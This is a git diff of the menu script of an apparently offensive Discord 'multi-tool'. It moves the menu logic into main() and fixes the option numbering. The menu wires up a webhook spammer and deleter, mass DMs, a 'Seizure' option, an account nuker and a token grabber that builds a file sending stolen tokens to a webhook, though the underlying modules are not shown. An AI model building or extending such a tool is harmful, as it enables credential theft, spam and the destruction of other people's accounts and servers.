@@ -1,12 +1,14 @@
 # Multi Tool v1
 # Don't Skid!
 # Made by Starlinkboy#0159
-# github.com/starlinkboy
+# https://github.com/starlinkboy/Carnage-Multi-tool-v1
 
 from util.plugins.common import *
 import httpx, os, sys, threading, time
 from pystyle import *
 from colorama import Fore
+import discord
+from discord.ext import tasks
 from pystyle import Colorate, Colors
 import multiprocessing
 import keyboard
@@ -21,35 +23,37 @@ import util.massdm
 threads = 3
 cancel_key = "ctrl+x"
 
+
 logo2 = "github.com/starlinkboy | Starlinkboy #0159"
 def main():
+
  logo = """
 
 
-                 ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗           Github: github.com/starlinkboy
-                 ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║           Discord: Starlinkboy#0159
-                 ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║           Multi-Tool v1
-                 ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║           Made with
-                 ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗      Love❌ Code✅
-                 ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+                  ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗           Github: github.com/starlinkboy/
+                  ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║           Discord: Starlinkboy#0159
+                  ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║           Multi-Tool v1
+                  ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║           Made with
+                  ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗      Love❌ Code✅
+                  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                            
 
   """
 
  opti = """
- [1] Webhook Destroyer               [4] Account Info
- [2] Mass Dm                         [5] Token Grabber
+ [1] Webhook Destroyer               [4] Account Info  
+ [2] Mass Dm                         [5] Token Grabber 
  [3] Seizure                         [6] Account Nuker
  """
 
  print(Colorate.Horizontal(Colors.purple_to_blue, f"{logo}"))
- time.sleep(5)
+ time.sleep(1.5)
  print(Colorate.Horizontal(Colors.purple_to_blue, f"{opti}"))
 
-main()
-choice = input(Colorate.Horizontal(Colors.purple_to_blue,'Choice: '))
 
-if choice == '1':
+ choice = input(Colorate.Horizontal(Colors.purple_to_blue,'Choice: '))
+
+ if choice == '1':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
@@ -80,7 +84,7 @@ if choice == '1':
                 f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
             util.Webhook_Spammer_Deleter.WebhookSpammer(WebHook, Message)
 
-elif choice == '2':
+ elif choice == '2':
         token = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
@@ -101,8 +105,8 @@ elif choice == '2':
         input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
         sleep(1.5)
         main()
-
-elif choice == '3':
+ 
+ elif choice == '3':
         token = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
@@ -120,14 +124,14 @@ elif choice == '3':
                 main()
                 break
 
-elif choice == '4':
+ elif choice == '4':
         token = input(
         f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
         util.accountinfo.Info(token)
 
 
-elif choice == '5':
+ elif choice == '5':
         WebHook = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
         validateWebhook(WebHook)
@@ -135,7 +139,7 @@ elif choice == '5':
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.RED}'))
         util.TokenGrabber.TokenGrabberV2(WebHook, fileName)
 
-elif choice == "1":
+ elif choice == "6":
     token = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
     validateToken(token)
@@ -149,6 +153,8 @@ elif choice == "1":
     if threading.active_count() < threads:
             threading.Thread(target=util.nuker.Hazard_Nuke, args=(token, Server_Name, message_Content)).start()
  
-else:
+ else:
   print("Invalid Option!!")
   main()
+
+main()
